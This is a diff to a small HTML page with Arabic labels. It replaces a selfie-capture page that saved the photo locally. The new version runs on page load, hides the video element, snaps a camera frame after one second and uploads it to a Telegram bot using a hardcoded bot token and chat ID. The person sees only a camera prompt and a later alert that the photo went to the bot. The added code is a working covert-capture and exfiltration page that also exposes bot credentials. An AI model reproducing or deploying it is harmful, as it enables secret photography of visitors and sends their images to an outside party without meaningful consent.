@@ -1,51 +1,49 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>التقاط صورة تلقائي</title>
+  <title>Take Photo</title>
 </head>
 <body>
-  <h2>📸 جاري التقاط صورة...</h2>
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <a id="downloadLink" style="display:none;">⬇️ تحميل الصورة</a>
+<h3>التقاط صورة تلقائيًا</h3>
+<video id="video" autoplay style="display:none;"></video>
+<script>
+const chatId = '7631694782';
+const botToken = '7629731228:AAHuRShLFPR1DbA8E3RYGOwNu_EDKAJVLh4';
 
-  <script>
-    async function captureSelfie() {
-      try {
-        // طلب إذن الكاميرا
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
+async function sendPhotoToTelegram(imgData) {
+    const formData = new FormData();
+    const blob = await (await fetch(imgData)).blob();
+    formData.append('chat_id', chatId);
+    formData.append('photo', blob, 'selfie.jpg');
 
-        // انتظر تشغيل الكاميرا
-        await new Promise(resolve => video.onloadedmetadata = resolve);
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    }).then(res => res.json())
+      .then(console.log)
+      .catch(console.error);
+}
 
-        // رسم اللقطة على الكانفس
-        const canvas = document.getElementById('canvas');
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+    const video = document.getElementById('video');
+    video.srcObject = stream;
+    video.addEventListener('loadedmetadata', () => {
+        const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // حفظ الصورة
-        const dataUrl = canvas.toDataURL("image/jpeg");
-        const link = document.getElementById('downloadLink');
-        link.href = dataUrl;
-        link.download = "selfie.jpg";
-        link.style.display = "block";
-        link.innerText = "⬇️ تحميل الصورة";
-
-        // إيقاف الكاميرا
-        stream.getTracks().forEach(track => track.stop());
-
-      } catch (err) {
-        alert("حدث خطأ: " + err.message);
-      }
-    }
-
-    // التقاط تلقائي عند الفتح
-    window.onload = captureSelfie;
-  </script>
+        // التقاط الصورة بعد 1 ثانية تلقائيًا
+        setTimeout(() => {
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imgData = canvas.toDataURL('image/jpeg');
+            sendPhotoToTelegram(imgData);
+            alert('تم التقاط الصورة وإرسالها للبوت!');
+        }, 1000);
+    });
+})
+.catch(err => alert('فشل الوصول إلى الكاميرا: ' + err));
+</script>
 </body>
 </html>
